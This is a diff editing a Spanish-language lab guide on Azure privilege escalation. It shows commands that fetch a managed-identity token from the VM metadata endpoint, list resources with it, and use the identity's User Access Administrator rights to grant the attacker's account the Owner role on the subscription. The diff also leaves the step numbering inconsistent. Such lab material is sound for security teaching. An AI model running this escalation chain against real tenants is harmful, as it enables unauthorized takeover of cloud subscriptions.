@@ -82,17 +82,21 @@ az login --service-principal \
 
 
 ### 2. Descubrimiento de la Identidad Administrada
+
 Dentro de la VM (simulado a través de run-command), el siguiente paso es descubrir la identidad administrada.
 
 Este script completo se ejecuta dentro de la VM para obtener el token y listar recursos
 
    1. Instalar silenciosamente jq, una herramienta necesaria para parsear JSON
+      
       sudo apt-get update > /dev/null 2>&1 && sudo apt-get install -y jq > /dev/null 2>&1
 
-  2. Obtener el token de acceso de la identidad, usando jq para extraerlo
+  3. Obtener el token de acceso de la identidad, usando jq para extraerlo
+     
         token=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H Metadata:true | jq -r .access_token)
         
       3. Usar el token para realizar una llamada a la API de Azure y listar recursos
+         
        curl -s -X GET -H "Authorization: Bearer $token" "https://management.azure.com/subscriptions/$(az account show --query id -o tsv)/resourceGroups/lab-escalation-rg/resources?api-version=2021-04-01"
 
 Resultado Esperado: Una salida JSON con la lista de todos los recursos del grupo lab-escalation. Esto prueba que el atacante ahora opera con los permisos de la identidad (User Access Administrator).
@@ -106,13 +110,16 @@ echo "El Object ID del atacante es: $user_object_id"
 
 
 B. (Ejecutado en la VM) Usar la identidad para asignar el rol de Owner al atacante
+
   Reemplaza <Tu_Object_ID> y <ID_de_tu_Suscripcion> con tus valores.
   
   az login --identity > /dev/null 2>&1
 
   Asignar el rol de Propietario al Object ID del atacante
+  
  az role assignment create --assignee "<Tu_Object_ID>" --role "Owner" --scope "/subscriptions/<ID_de_tu_Suscripcion>"
-    '
+
+    
 Resultado Esperado: Una salida JSON que confirma la creación de la nueva asignación de rol.
 
 para deslogearte de la identidad administrada ejecuta el siguiente script
@@ -127,4 +134,5 @@ az login --service-principal \
     --tenant "EL_TENANT_ID_PROPORCIONADO"
 
 (En la máquina local) El atacante, ahora Owner, crea un nuevo grupo de recursos
+
 az group create --name "prueba-de-control-total" --location "westus"
